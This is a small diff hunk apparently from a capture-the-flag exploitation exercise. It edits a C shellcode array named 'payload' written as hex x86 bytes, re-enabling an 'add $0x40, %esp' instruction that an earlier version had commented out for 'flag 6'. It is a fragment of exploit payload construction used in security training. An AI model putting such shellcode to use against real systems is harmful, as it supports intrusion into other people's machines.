@@ -87,7 +87,7 @@ unsigned char payload[] =
 	"\x2c\x0e"			/* C	*/
 	"\x39\xc4"			/*[^_-]	*/
 	/* ------------------------------------	*/
-	 //"\x83\xc4\x40"	/* add $0x40, %esp	*/ (Removed for flag 6)
+	 "\x83\xc4\x40"	/* add $0x40, %esp	*/ //(Removed for flag 6)
 	/* ------------------------------------	*/
 	/*
 	 * push
